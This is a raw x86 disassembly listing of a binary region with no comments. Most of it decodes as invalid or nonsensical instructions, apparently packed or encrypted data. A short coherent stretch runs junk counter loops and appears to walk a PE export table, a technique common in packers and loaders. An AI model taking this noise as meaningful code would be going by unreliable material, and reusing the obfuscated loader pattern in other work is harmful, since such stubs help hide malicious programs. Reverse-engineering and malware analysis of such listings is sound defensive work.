  413f2d:	in     al,dx
  413f2e:	out    dx,eax
  413f2f:	aad    0x2c
  413f31:	xchg   edi,eax
  413f32:	xchg   DWORD PTR [ebx+0x3b0db232],edi
  413f38:	retf   0x4b7a
  413f3b:	hlt    
  413f3c:	call   0xf0b16265
  413f41:	mov    WORD PTR [ebx-0xb65c27d],cs
  413f47:	mov    WORD PTR [ebp-0x57],cs
  413f4a:	fstp   DWORD PTR [ebx+0x69]
  413f4d:	or     eax,0x10c46fb7
  413f52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f53:	or     eax,DWORD PTR [eax-0x42f06392]
  413f59:	imul   esp,DWORD PTR [esi],0xb731afb
  413f5f:	out    0xfc,eax
  413f61:	sbb    cl,BYTE PTR [ecx]
  413f63:	es cmp edx,eax
  413f66:	cmc    
  413f67:	enter  0x1768,0x9c
  413f6b:	pop    esi
  413f6c:	xor    eax,0x8ef08ee0
  413f71:	into   
  413f72:	cs out dx,al
  413f74:	xchg   edi,eax
  413f75:	push   edi
  413f76:	inc    eax
  413f77:	aas    
  413f78:	outs   dx,DWORD PTR ds:[esi]
  413f79:	push   ecx
  413f7a:	aad    0x37
  413f7c:	jbe    0x413fcd
  413f7e:	popf   
  413f7f:	hlt    
  413f80:	and    eax,0x440334f1
  413f85:	in     eax,dx
  413f86:	(bad)  
  413f87:	test   ch,0x31
  413f8a:	pop    ebx
  413f8b:	(bad)  
  413f8c:	and    eax,0x3993f0af
  413f91:	mov    DWORD PTR [ecx],esi
  413f93:	pop    ss
  413f94:	rcl    DWORD PTR [eax-0x7dcad0a6],0x32
  413f9b:	fidiv  DWORD PTR [ebp+0x1b]
  413f9e:	repz bnd jl 0x413fbf
  413fa2:	dec    eax
  413fa3:	xlat   BYTE PTR ds:[ebx]
  413fa4:	es call 0xe60f:0xa24cfb2d
  413fac:	mov    esi,0xbabe2c3e
  413fb1:	inc    esi
  413fb2:	std    
  413fb3:	mov    dl,0x45
  413fb5:	fiadd  DWORD PTR [esi-0x57]
  413fb8:	hlt    
  413fb9:	mov    bl,0xe1
  413fbb:	fisubr DWORD PTR [ebx]
  413fbd:	jmp    0xd71c:0xc757663d
  413fc4:	mov    eax,0xbbab0a0e
  413fc9:	(bad)  
  413fca:	fdiv   QWORD PTR [edi+0x31]
  413fcd:	outs   dx,BYTE PTR ds:[esi]
  413fce:	add    eax,0x78168340
  413fd3:	push   esp
  413fd4:	and    dh,cl
  413fd6:	je     0x413f60
  413fd8:	int3   
  413fd9:	cmp    BYTE PTR [eax+0x5],0xb4
  413fdd:	and    ah,BYTE PTR [edx]
  413fdf:	(bad)  
  413fe0:	std    
  413fe1:	cdq    
  413fe2:	(bad)  
  413fe3:	cmp    esi,esp
  413fe5:	sbb    BYTE PTR [eax-0x33b838b4],ah
  413feb:	mov    edx,0x60d05c7d
  413ff0:	aas    
  413ff1:	mov    ah,0x11
  413ff3:	jmp    0x1277:0x8411cd38
  413ffa:	addr16 mov al,0x24
  413ffd:	lock out 0x20,al
  414000:	push   0xd8d6c27e
  414005:	call   0x9829:0x84385d3
  41400c:	and    eax,0xb0edb459
  414011:	xchg   ebp,eax
  414012:	jae    0x414001
  414014:	lods   al,BYTE PTR ds:[esi]
  414015:	pop    ss
  414016:	mov    eax,ds:0x53fada05
  41401b:	sti    
  41401c:	imul   DWORD PTR [ebx+0x5d469f17]
  414022:	mov    BYTE PTR [eax],ch
  414024:	popa   
  414025:	addr16 lock and eax,0xeaf79926
  41402c:	ja     0x414042
  41402e:	gs pop ebp
  414030:	jecxz  0x4140b0
  414032:	int3   
  414033:	mov    esp,0xd2ad9998
  414038:	in     eax,0x43
  41403a:	aad    0x8f
  41403c:	xor    al,0xc7
  41403e:	adc    eax,0x7b6e1c5f
  414043:	out    dx,al
  414044:	add    eax,DWORD PTR [edi-0x4f]
  414047:	loope  0x413fe3
  414049:	jle    0x41402d
  41404b:	xchg   ebp,eax
  41404c:	mov    ch,0xb5
  41404e:	scas   eax,DWORD PTR es:[edi]
  41404f:	dec    ebp
  414050:	fs dec ecx
  414052:	push   ds
  414053:	pop    ebx
  414054:	mov    ch,ch
  414056:	jbe    0x414080
  414058:	lods   al,BYTE PTR ds:[esi]
  414059:	cdq    
  41405a:	test   BYTE PTR [ebp+0x73bd622c],dh
  414060:	jns    0x414092
  414062:	sahf   
  414063:	(bad)  [ebx+0x31aec076]
  414069:	jne    0x414000
  41406b:	jp     0x413ffe
  41406d:	pop    esp
  41406e:	xchg   ecx,eax
  41406f:	cli    
  414070:	cmp    al,0xb7
  414072:	lea    ebx,[edx]
  414074:	ret    0x4275
  414077:	pusha  
  414078:	push   ss
  414079:	and    ebp,0xffffff9b
  41407c:	push   ecx
  41407d:	jbe    0x414024
  41407f:	aaa    
  414080:	sbb    ebx,DWORD PTR [edi+0x76]
  414083:	inc    eax
  414084:	mov    esp,0x3245b28d
  414089:	cmp    bl,BYTE PTR [ecx]
  41408b:	test   BYTE PTR [eax],0xae
  41408e:	push   esi
  41408f:	push   esp
  414090:	and    esp,edi
  414092:	sbb    bh,BYTE PTR [ecx+0x128d3451]
  414098:	mov    ch,bl
  41409a:	push   es
  41409b:	jb     0x41405c
  41409d:	nop
  41409e:	push   edi
  41409f:	jb     0x414039
  4140a1:	pop    eax
  4140a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140a3:	add    DWORD PTR [edi+0x2c],0xc6c927e5
  4140aa:	xchg   BYTE PTR [edx+0x7265b1a1],al
  4140b0:	jl     0x41411d
  4140b2:	push   ds
  4140b3:	mov    ch,0x66
  4140b5:	jge    0x41411f
  4140b7:	dec    edi
  4140b8:	jle    0x4140b2
  4140ba:	push   ebx
  4140bb:	shr    BYTE PTR [eax+0x1e],0x39
  4140bf:	mov    ecx,0xe82c2332
  4140c4:	stos   BYTE PTR es:[edi],al
  4140c5:	cmp    al,0xd
  4140c7:	pop    edx
  4140c8:	(bad)  
  4140c9:	adc    al,0x41
  4140cb:	mov    cl,BYTE PTR [ebp+0x1f]
  4140ce:	outs   dx,BYTE PTR ds:[esi]
  4140cf:	mov    BYTE PTR [eax],ch
  4140d1:	out    dx,al
  4140d2:	mov    ch,0x6d
  4140d4:	sub    ebx,DWORD PTR [ebp+0x38]
  4140d7:	das    
  4140d8:	in     eax,0xab
  4140da:	aas    
  4140db:	test   BYTE PTR [esi-0x16],bl
  4140de:	cmp    ah,dl
  4140e0:	sbb    edx,DWORD PTR [esi]
  4140e2:	xchg   edx,eax
  4140e3:	fadd   st(0),st
  4140e5:	cmp    cl,dl
  4140e7:	or     edx,edi
  4140e9:	xchg   ebp,eax
  4140ea:	fcomi  st,st(7)
  4140ec:	or     BYTE PTR [ecx-0x5b],dh
  4140ef:	xor    ah,ch
  4140f1:	xchg   edi,eax
  4140f2:	aas    
  4140f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140f4:	sar    cl,cl
  4140f6:	int3   
  4140f7:	cmp    cl,BYTE PTR [eax]
  4140f9:	lock xor BYTE PTR ds:0xb137c661,dl
  414100:	dec    ebp
  414101:	aad    0x22
  414103:	mov    eax,0x4ab70d1e
  414108:	dec    edx
  414109:	sub    eax,0x6ae9b6ec
  41410e:	fsubr  QWORD PTR [edi]
  414110:	adc    eax,0x58b43880
  414115:	popa   
  414116:	inc    ebx
  414117:	push   esp
  414118:	hlt    
  414119:	pop    es
  41411a:	cdq    
  41411b:	mov    ecx,0xe5b7122c
  414120:	cld    
  414121:	(bad)  
  414122:	pop    ss
  414123:	push   ebx
  414124:	xlat   BYTE PTR ds:[ebx]
  414125:	pop    ebx
  414126:	test   DWORD PTR [ebx+ebp*2-0x3fa053c4],esi
  41412d:	sbb    DWORD PTR [ebx-0x4ef27ec1],esp
  414133:	js     0x41413e
  414135:	sub    eax,0x8d31100
  41413a:	or     bl,BYTE PTR [ebx]
  41413c:	push   ss
  41413d:	adc    bh,bh
  41413f:	lods   eax,DWORD PTR ds:[esi]
  414140:	jns    0x4140d7
  414142:	jae    0x41417e
  414144:	cmp    DWORD PTR [edx-0x5c],ebx
  414147:	and    eax,0x2047f0bb
  41414c:	pop    ss
  41414d:	mov    BYTE PTR [ecx+0x6f52cc93],bl
  414153:	imul   ebp,DWORD PTR [ebp+0x385f45b8],0xa048217e
  41415d:	out    dx,eax
  41415e:	mov    eax,DWORD PTR [ebp-0x14]
  414161:	and    DWORD PTR ds:0x42fcd5,0x0
  41416b:	mov    ecx,DWORD PTR ds:0x42fcd5
  414171:	inc    ecx
  414172:	mov    DWORD PTR ds:0x42fcd5,ecx
  414178:	cmp    DWORD PTR ds:0x42fcd5,0x2c
  41417f:	jne    0x41418b
  414185:	call   DWORD PTR ds:0x42e56f
  41418b:	cmp    DWORD PTR ds:0x42fcd5,0x1e
  414192:	jb     0x41416b
  414198:	mov    ecx,DWORD PTR [ebp+0x8]
  41419b:	or     DWORD PTR ds:0x42fcd9,0x46b9
  4141a5:	add    ecx,DWORD PTR [eax+0x20]
  4141a8:	mov    DWORD PTR [ebp-0x28],ecx
  4141ab:	or     eax,DWORD PTR ds:0x42e6ff
  4141b1:	mov    eax,DWORD PTR [ebp-0x14]
  4141b4:	mov    ecx,DWORD PTR ds:0x42fce9
  4141ba:	sbb    DWORD PTR ds:0x42fcd5,ecx
  4141c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4141c3:	add    DWORD PTR ds:0x42fd05,0x42e713
  4141cd:	add    ecx,DWORD PTR [eax+0x24]
  4141d0:	add    DWORD PTR ds:0x42e6eb,edi
  4141d6:	mov    DWORD PTR [ebp-0x2c],ecx
  4141d9:	mov    eax,DWORD PTR [ebp-0x14]
  4141dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4141df:	add    ecx,DWORD PTR [eax+0x1c]
  4141e2:	neg    eax
  4141e4:	xor    esi,esi
  4141e6:	and    DWORD PTR ds:0x42fd05,ebx
  4141ec:	mov    DWORD PTR [ebp-0x14],ecx
  4141ef:	or     DWORD PTR ds:0x42e70f,ecx
  4141f5:	mov    eax,DWORD PTR [ebp-0x28]
  4141f8:	and    DWORD PTR ds:0x42fcdd,0x0
  414202:	mov    ecx,DWORD PTR ds:0x42fcdd
  414208:	inc    ecx
  414209:	mov    DWORD PTR ds:0x42fcdd,ecx
  41420f:	cmp    DWORD PTR ds:0x42fcdd,0xc
  414216:	jne    0x41423b
  41421c:	push   DWORD PTR [ebp-0x18]
  41421f:	push   DWORD PTR [ebp-0x10]
  414222:	push   0x25b2
  414227:	push   DWORD PTR [ebp-0x10]
  41422a:	push   0x5d78
  41422f:	push   DWORD PTR [ebp-0x24]
  414232:	push   DWORD PTR [ebp-0x10]
  414235:	call   DWORD PTR ds:0x42e573
  41423b:	cmp    DWORD PTR ds:0x42fcdd,0xb
  414242:	jne    0x414257
  414248:	xor    ecx,ecx
  41424a:	add    ecx,DWORD PTR ds:0x42fcdd
  414250:	inc    ecx
  414251:	mov    DWORD PTR ds:0x42fcdd,ecx
  414257:	cmp    DWORD PTR ds:0x42fcdd,0x14
  41425e:	jb     0x414202
  414264:	mov    ecx,DWORD PTR [ebp+0x8]
  414267:	add    ecx,DWORD PTR [eax+edi*4]
  41426a:	lea    eax,[ebp-0x8]
  41426d:	mov    DWORD PTR [ebp-0x30],ecx
  414270:	push   eax
  414271:	jmp    0x414555
  414276:	add    ebx,0xffffff97
  414279:	xor    eax,0x71a17157
  41427e:	inc    edx
  41427f:	cld    
  414280:	xchg   ebx,eax
  414281:	loop   0x4142d4
  414283:	mov    ah,0x6f
  414285:	sahf   
  414286:	xor    BYTE PTR [ebx+0x70],0x70
  41428a:	mov    ecx,0x8a70707e
  41428f:	dec    ecx
  414290:	les    edx,FWORD PTR [ecx+0x1]
  414293:	das    
  414294:	sub    eax,0x4b650955
  414299:	jo     0x414240
  41429b:	in     eax,0x70
  41429d:	pop    es
  41429e:	imul   esi,DWORD PTR [eax+0x54],0x46f85176
  4142a5:	cs sbb esi,eax
  4142a8:	gs mov cl,0xc6
  4142ab:	jl     0x414298
  4142ad:	mov    edi,0xac1a701b
  4142b2:	sar    edx,1
  4142b4:	ret    0xcbb1
  4142b7:	cs mov edi,0x810d1db2
  4142bd:	jmp    0xc30e:0xfe9573cf
  4142c4:	sub    BYTE PTR [ebx-0x2c18ebe2],0x74
  4142cb:	add    ebp,edi
  4142cd:	or     al,0xb5
  4142cf:	repnz xlat BYTE PTR ds:[ebx]
  4142d1:	sbb    cl,ah
  4142d3:	mov    ebp,0xdfd4989c
  4142d8:	int    0x43
  4142da:	fild   WORD PTR [ecx+0x66]
  4142dd:	les    ecx,FWORD PTR [edi]
  4142df:	shl    BYTE PTR [edi+0x45c43942],1
  4142e5:	std    
  4142e6:	scas   eax,DWORD PTR es:[edi]
  4142e7:	push   0x80e68f14
  4142ec:	div    BYTE PTR [ebp+0x13]
  4142ef:	es and eax,0x1931c1b4
  4142f5:	push   cs
  4142f6:	out    0x84,al
  4142f8:	fdivr  DWORD PTR [ecx+0x3a49bdca]
  4142fe:	inc    eax
  4142ff:	in     eax,0xce
  414301:	adc    BYTE PTR [edi],cl
  414303:	test   BYTE PTR [eax-0x1eb7264c],bh
  414309:	bound  edi,QWORD PTR [eax+0x3933e472]
  41430f:	xor    DWORD PTR [ebx],ecx
  414311:	inc    eax
  414312:	sbb    BYTE PTR [edx-0x1a],ch
  414315:	imul   edi,DWORD PTR [edi+eiz*8-0x4ae29dd7],0xb7202a42
  414320:	dec    ecx
  414321:	sub    BYTE PTR [edx-0x2a32387b],bh
  414327:	loop   0x414344
  414329:	jl     0x4142d0
  41432b:	dec    ecx
  41432c:	xor    BYTE PTR [edi-0x4d],bh
  41432f:	xchg   esi,eax
  414330:	xlat   BYTE PTR ds:[ebx]
  414331:	ret    
  414332:	loopne 0x41438b
  414334:	push   cs
  414335:	xchg   edi,eax
  414336:	inc    ebp
  414337:	sbb    dh,BYTE PTR [ecx+0x2d37b21a]
  41433d:	adc    al,0x96
  41433f:	popf   
  414340:	mov    ah,BYTE PTR [ecx]
  414342:	loopne 0x41437e
  414344:	mov    eax,0x20016247
  414349:	(bad)  
  41434a:	fnsave [eax]
  41434c:	call   0x7592:0x33986dba
  414353:	mov    dh,0xf8
  414355:	inc    ecx
  414356:	cmp    al,0x3d
  414358:	jae    0x414366
  41435a:	or     al,0x88
  41435c:	cwde   
  41435d:	aaa    
  41435e:	xchg   BYTE PTR [ecx],ah
  414360:	dec    ecx
  414361:	adc    BYTE PTR [eax],dl
  414363:	imul   esi,edx,0xe93f93ed
  414369:	mov    dl,0xe4
  41436b:	pop    es
  41436c:	or     al,0xcf
  41436e:	ret    
  41436f:	push   edi
  414370:	jmp    FWORD PTR [edx]
  414372:	push   ecx
  414373:	jl     0x4143c8
  414375:	mov    BYTE PTR [ecx-0x3b],al
  414378:	dec    esi
  414379:	or     al,0x65
  41437b:	fstp   DWORD PTR [ebx-0xd]
  41437e:	dec    ebp
  41437f:	xchg   DWORD PTR [eax-0x523802b9],eax
  414385:	(bad)
  41438a:	std    
  41438b:	or     BYTE PTR [esi+0x22],dh
  41438e:	dec    ebx
  41438f:	xchg   DWORD PTR [esi+ecx*4+0x45b0582],edi
  414396:	ret    0x711e
  414399:	pop    ebp
  41439a:	jno    0x4143c6
  41439c:	mov    eax,DWORD PTR [edx+0xd]
  41439f:	cmp    BYTE PTR [edx-0x29da1450],dh
  4143a5:	retf   0x4efd
  4143a8:	(bad)  
  4143a9:	mov    al,0x32
  4143ab:	sub    DWORD PTR [ebx-0x17],esp
  4143ae:	jg     0x4143ee
  4143b0:	jbe    0x41439d
  4143b2:	sbb    eax,0x97aeaf13
  4143b7:	shr    BYTE PTR [eax-0x67a73e9a],1
  4143bd:	call   DWORD PTR [edi]
  4143bf:	xor    al,0x52
  4143c1:	iret   
  4143c2:	mov    bl,BYTE PTR [edx+0x16d2e5e8]
  4143c8:	fs and eax,0x6994923a
  4143ce:	jbe    0x414401
  4143d0:	loopne 0x41440f
  4143d2:	cwde   
  4143d3:	mov    ds:0x516487e4,eax
  4143d8:	or     BYTE PTR [esp+eax*2-0x358c7bc6],0x11
  4143e0:	mov    bh,0xe
  4143e2:	or     eax,0xf9f79fcc
  4143e7:	xchg   DWORD PTR [edi+eax*2],edx
  4143ea:	(bad)  
  4143ec:	fwait
  4143ed:	push   es
  4143ee:	fidivr WORD PTR [edx-0x34a5e6bf]
  4143f4:	cmp    al,0x7
  4143f6:	and    DWORD PTR [eax-0x21],edi
  4143f9:	push   0xffffffcf
  4143fb:	bound  eax,QWORD PTR [ebp+0x55]
  4143fe:	into   
  4143ff:	sbb    eax,0xc50069b8
  414404:	adc    dh,BYTE PTR [ebp+0x628def8c]
  41440a:	lock xor DWORD PTR ds:0xb57ba5f3,ebx
  414411:	outs   dx,DWORD PTR ds:[esi]
  414412:	(bad)  
  414413:	push   ss
  414414:	jmp    0x264dfdd7
  414419:	fdivr  DWORD PTR [edi]
  41441b:	cmp    ebx,edi
  41441d:	xchg   ebp,eax
  41441e:	xor    BYTE PTR [ebp+0x47],bh
  414421:	sub    dh,BYTE PTR [edi+0x4918f9cb]
  414427:	cwde   
  414428:	ins    BYTE PTR es:[edi],dx
  414429:	mov    eax,edi
  41442b:	lock dec edi
  41442d:	mov    cl,0x1d
  41442f:	xchg   esp,eax
  414430:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414431:	cmp    BYTE PTR [ebx+0x29],0x97
  414435:	push   0xc9541b80
  41443a:	outs   dx,BYTE PTR ds:[esi]
  41443b:	gs xor ebp,ebp
  41443e:	jb     0x41449a
  414440:	out    dx,al
  414441:	add    ah,bh
  414443:	out    0x17,eax
  414445:	dec    edx
  414446:	jmp    DWORD PTR [esi+0x31]
  414449:	push   0xc6441ed5
  41444e:	or     DWORD PTR [ebx-0x346e0bf3],0xffffffbf
  414455:	bound  ebp,QWORD PTR [ebp-0x2ab1e92a]
  41445b:	mov    esp,0xfef5683e
  414460:	mov    ecx,0xb750b75f
  414465:	lea    esp,[ecx+edx*2+0x30]
  414469:	(bad)  
  41446a:	xchg   esp,eax
  41446b:	push   0xffffffff
  41446d:	fisub  DWORD PTR [ebp+0x69]
  414470:	push   ebp
  414471:	jp     0x414409
  414473:	pop    ds
  414474:	call   0x4bdf:0x1298b380
  41447b:	loop   0x414437
  41447d:	inc    eax
  41447e:	in     eax,dx
  41447f:	cmp    eax,0xc3bf6a5f
  414484:	and    al,0x4c
  414486:	pop    ecx
  414487:	pusha  
  414488:	jp     0x414472
  41448a:	push   edi
  41448b:	stos   BYTE PTR es:[edi],al
  41448c:	dec    ebx
  41448d:	inc    eax
  41448e:	(bad)  
  41448f:	mov    bl,0x17
  414491:	imul   edx,DWORD PTR [ebp+0x64],0x15ce7540
  414498:	or     ah,dl
  41449a:	or     al,0xdb
  41449c:	xor    ah,dl
  41449e:	mov    edx,0xf6110057
  4144a3:	adc    BYTE PTR [ecx],dl
  4144a5:	jns    0x4144c5
  4144a7:	mov    ah,0xd1
  4144a9:	xrelease xchg BYTE PTR [ebx+0x79],cl
  4144ad:	sahf   
  4144ae:	mov    al,ds:0xf81d625a
  4144b3:	imul   esi,ebx,0x5b
  4144b6:	pop    edi
  4144b7:	sahf   
  4144b8:	lods   eax,DWORD PTR ds:[esi]
  4144b9:	leave  
  4144ba:	hlt    
  4144bb:	sub    edx,DWORD PTR [esi+eiz*1]
  4144be:	mov    ds:0x141d5161,eax
  4144c3:	js     0x414495
  4144c5:	jmp    0x414490
  4144c7:	(bad)  
  4144c8:	daa    
  4144c9:	inc    esi
  4144ca:	dec    eax
  4144cb:	sahf   
  4144cc:	dec    ecx
  4144cd:	out    0xe7,al
  4144cf:	jle    0x4144c4
  4144d1:	sbb    eax,0xd6369bbe
  4144d6:	cmp    BYTE PTR [edi+0x6a9dc73],dl
  4144dc:	sbb    bl,BYTE PTR [esi+edi*2]
  4144df:	mov    ?,ebp
  4144e1:	cld    
  4144e2:	cli    
  4144e3:	test   BYTE PTR [ebx],bl
  4144e5:	inc    esi
  4144e6:	ret    
  4144e7:	lahf   
  4144e8:	stos   DWORD PTR es:[edi],eax
  4144e9:	pop    eax
  4144ea:	fcomi  st,st(3)
  4144ec:	shr    ah,0x53
  4144ef:	push   0xffffffc4
  4144f1:	cdq    
  4144f2:	in     eax,dx
  4144f3:	(bad)  [esi+0x3ac54af1]
  4144f9:	stc    
  4144fa:	add    ebp,DWORD PTR [ebx]
  4144fc:	cmp    DWORD PTR [edx-0x6e],ecx
  4144ff:	out    0x8b,eax
  414501:	std    
  414502:	nop
  414503:	fdiv   QWORD PTR [esi+0x19d6901f]
  414509:	(bad)  
  41450a:	stos   DWORD PTR es:[edi],eax
  41450b:	dec    esi
  41450c:	clc    
  41450d:	mov    edx,0x95719307
  414512:	(bad)  
  414513:	mov    DWORD PTR [ebp+0x611cc78],esi
  414519:	mov    bh,0xb7
  41451b:	loope  0x41453e
  41451d:	outs   dx,BYTE PTR ds:[esi]
  41451e:	mov    BYTE PTR [eax+0x4d5d5491],dh
  414524:	mov    ax,0x7a7d
  414528:	enter  0xe9c1,0xd3
  41452c:	pop    edi
  41452d:	scas   al,BYTE PTR es:[edi]
  41452e:	jp     0x41456b
  414530:	and    eax,0xc1970f03
  414535:	xrelease xchg BYTE PTR [esi],bl
  414538:	enter  0xbec5,0x56
  41453c:	sub    eax,DWORD PTR [ebx+edx*4]
  41453f:	push   ebx
  414540:	mov    al,ds:0xe0665b85
  414545:	push   ebp
  414546:	fidiv  WORD PTR [esi+0x7a5e6474]
  41454c:	fsubr  QWORD PTR [bp+di]
  414550:	sub    ebx,esp
  414552:	adc    eax,0x75ffc569
  414557:	sar    bh,1
  414559:	jne    0x414567
  41455b:	call   0x4036c0
  414560:	mov    eax,DWORD PTR [ebp-0x4]
  414563:	jmp    0x414847
  414568:	ret    
  414569:	sbb    al,0xfd
  41456b:	sub    BYTE PTR [ebp-0x4f],ah
  41456e:	jno    0x41455b
  414570:	pop    ebx
  414571:	or     eax,0x42f2beb4
  414576:	sub    BYTE PTR [edi+0x707f70c9],dh
  41457c:	mov    ecx,0x4370707e
  414581:	adc    eax,0x7fff5238
  414586:	lahf   
  414587:	in     al,dx
  414588:	out    dx,eax
  414589:	dec    DWORD PTR [ecx]
  41458b:	ins    BYTE PTR es:[edi],dx
  41458c:	rcl    DWORD PTR ds:0xfcac7570,cl
  414592:	mov    esi,0x66d6845e
  414597:	ret    0xb55b
  41459a:	js     0x4145aa
  41459c:	fdivr  QWORD PTR [esi-0x133b79aa]
  4145a2:	ret    0x6fdc
  4145a5:	jmp    0x65b7b421
  4145aa:	popa   
  4145ab:	and    DWORD PTR [esi+eiz*1-0x22],eax
  4145af:	adc    eax,esp
  4145b1:	pop    ebx
  4145b2:	addr16 xor esi,0x5ce842eb
  4145b9:	cld    
  4145ba:	lods   al,BYTE PTR ds:[esi]
  4145bb:	adc    eax,edx
  4145bd:	pop    ecx
  4145be:	jno    0x41462f
  4145c0:	add    DWORD PTR [ebp-0x80],edi
  4145c3:	dec    ebp
  4145c4:	lock ror BYTE PTR [esi+0x2],1
  4145c8:	inc    ebp
  4145c9:	and    DWORD PTR [esi+0x4d],eax
  4145cc:	das    
  4145cd:	xor    ah,BYTE PTR [ebp-0x33e9ea04]
  4145d3:	test   al,0x14
  4145d5:	(bad)  
  4145d6:	imul   ebx,DWORD PTR [ebx-0x7e6591c8],0xffffffa0
  4145dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145de:	je     0x4145c1
  4145e0:	or     esi,edx
  4145e2:	pop    ebp
  4145e3:	and    esi,DWORD PTR [esp+ebp*1]
  4145e6:	mov    eax,0xd352fb9a
  4145eb:	jle    0x414612
  4145ed:	in     al,0x8b
  4145ef:	popa   
  4145f0:	mov    al,0x63
  4145f2:	jmp    0xbb78b10f
  4145f7:	jecxz  0x4145f5
  4145f9:	cs push edx
  4145fb:	sbb    DWORD PTR [ebp+0x30],esp
  4145fe:	retf   
  4145ff:	les    esp,FWORD PTR [ecx]
  414601:	or     al,0x2c
  414603:	out    0x5a,eax
  414605:	sbb    DWORD PTR [ebx],edx
  414607:	and    DWORD PTR [ebp-0x1e],edi
  41460a:	jns    0x414643
  41460c:	mov    ecx,0xfcf424c2
  414611:	or     DWORD PTR [esi],ebp
  414613:	push   es
  414614:	mov    ebp,0x43707720
  414619:	popa   
  41461a:	stos   BYTE PTR es:[edi],al
  41461b:	call   0x7ab4:0x9912e793
  414622:	dec    ebp
  414623:	dec    esp
  414624:	or     al,0x2c
  414626:	jmp    0x4145b0
  414628:	mov    eax,ds:0xa568733d
  41462d:	aad    0x69
  41462f:	pop    esi
  414630:	mov    eax,0x8b891d7d
  414635:	mov    bh,0x36
  414637:	mov    ch,0xef
  414639:	sahf   
  41463a:	xor    BYTE PTR [edi-0x6a],ch
  41463d:	ror    DWORD PTR [ebx+0x1336ad4c],0x6f
  414644:	or     eax,0x167f76fb
  414649:	adc    BYTE PTR [edi],dh
  41464b:	call   0xec5a:0x38f2df7
  414652:	faddp  st(5),st
  414654:	push   0x11
  414656:	pusha  
  414657:	ins    BYTE PTR es:[edi],dx
  414658:	outs   dx,BYTE PTR ds:[esi]
  414659:	js     0x414602
  41465b:	cdq    
  41465c:	add    edi,ebp
  41465e:	xchg   DWORD PTR [ebx],esp
  414660:	sar    ah,0x57
  414663:	sub    eax,0x3c9517d
  414668:	mov    esi,0x725f9808
  41466d:	jb     0x414610
  41466f:	(bad)  [ebx-0x5b]
  414672:	es scas al,BYTE PTR es:[edi]
  414674:	fadd   QWORD PTR [eax-0x62]
  414677:	or     eax,0xb6113a24
  41467c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41467d:	fcom   QWORD PTR [edx+edi*1]
  414680:	ins    BYTE PTR es:[edi],dx
  414681:	(bad)  
  414683:	and    al,0x1d
  414686:	pop    ebx
  414687:	(bad)  [ecx+0x481df1a3]
  41468d:	add    al,0x83
  41468f:	in     al,dx
  414690:	and    BYTE PTR [edx+0x58],dh
  414693:	add    BYTE PTR [edi],ah
  414695:	pushf  
  414696:	sub    al,BYTE PTR [ecx-0x4a]
  414699:	jnp    0x414665
  41469b:	out    0x1b,al
  41469d:	jb     0x414695
  41469f:	adc    ch,cl
  4146a1:	dec    ebp
  4146a2:	xlat   BYTE PTR ds:[ebx]
  4146a3:	lahf   
  4146a4:	lds    ecx,FWORD PTR [edx]
  4146a6:	in     al,0x18
  4146a8:	xchg   ebp,eax
  4146a9:	pop    edx
  4146aa:	adc    BYTE PTR [ebx-0x50549fa3],ah
  4146b0:	add    al,0x56
  4146b2:	sbb    BYTE PTR [eax-0x1c],0xc6
  4146b6:	mov    ds:0x7ba12a25,al
  4146bb:	(bad)  
  4146bc:	xchg   edx,eax
  4146bd:	loopne 0x4146ac
  4146bf:	xor    eax,0x56aa3764
  4146c4:	mov    DWORD PTR [ebx+0x7c],esi
  4146c7:	repz call 0xb71a:0x10c5b37
  4146cf:	xchg   esi,eax
  4146d0:	loop   0x41465c
  4146d2:	pop    ss
  4146d3:	adc    ah,cl
  4146d5:	div    BYTE PTR [esi]
  4146d7:	jb     0x4146c2
  4146d9:	addr16 push ebp
  4146db:	push   ebx
  4146dc:	push   eax
  4146dd:	cmp    edi,DWORD PTR [esi]
  4146df:	inc    eax
  4146e0:	ret    
  4146e1:	inc    eax
  4146e2:	fs loop 0x414665
  4146e5:	push   eax
  4146e6:	inc    ebx
  4146e7:	int3   
  4146e8:	or     al,0x6e
  4146ea:	add    DWORD PTR [ebp+0x5a738132],esi
  4146f0:	xor    al,0x5a
  4146f2:	inc    esi
  4146f3:	adc    DWORD PTR [ecx],ebx
  4146f5:	lods   al,BYTE PTR ds:[esi]
  4146f6:	jo     0x414732
  4146f8:	gs cmp ch,dl
  4146fb:	leave  
  4146fc:	fisub  WORD PTR [eax]
  4146fe:	sahf   
  4146ff:	cmp    eax,0x5309cb34
  414704:	pause  
  414706:	cwde   
  414707:	jne    0x4146c1
  414709:	or     eax,0xb9d3998b
  41470e:	jp     0x4146ed
  414710:	adc    ah,dh
  414712:	pop    ebp
  414713:	add    bh,BYTE PTR [ecx+0x3d402ec7]
  414719:	imul   edx,eax,0xffffff9b
  41471c:	loop   0x414733
  41471e:	mov    dl,0x33
  414720:	xchg   ebx,eax
  414721:	jmp    0xbc7e:0xa1e3537e
  414728:	jns    0x41476b
  41472a:	and    al,0x12
  41472c:	loope  0x4146ff
  41472e:	es mov al,0xa0
  414731:	aad    0xb9
  414733:	fcmovnbe st,st(6)
  414735:	aad    0x8e
  414737:	mov    WORD PTR [edi+0x6a055299],ds
  41473d:	push   ebp
  41473e:	jne    0x4146fb
  414740:	test   BYTE PTR [edi],ch
  414742:	test   BYTE PTR [esp+eiz*8+0x7ae474de],al
  414749:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41474a:	xor    BYTE PTR [edx+0x7fbebc4f],ah
  414750:	(bad)  
  414752:	aaa    
  414753:	mov    dh,ch
  414755:	xor    BYTE PTR [edi+0x2],bh
  414758:	push   es
  414759:	sbb    bh,BYTE PTR [ebp+0x32]
  41475c:	mov    edx,0x4c4cc23d
  414761:	ror    DWORD PTR [ecx+0x70034820],0x59
  414768:	scas   al,BYTE PTR es:[edi]
  414769:	sbb    al,BYTE PTR [edx-0x7e3efba7]
  41476f:	retf   0x4e43
  414772:	xchg   DWORD PTR [eax+ebp*1-0x9e4052d],esp
  414779:	sub    eax,0x4be202f2
  41477e:	mov    esp,0x9947376d
  414783:	push   edx
  414784:	popa   
  414785:	test   DWORD PTR ds:0xbd4da41f,0x2f2573a
  41478f:	in     eax,dx
  414790:	cwde   
  414791:	int    0x22
  414793:	cli    
  414794:	not    bh
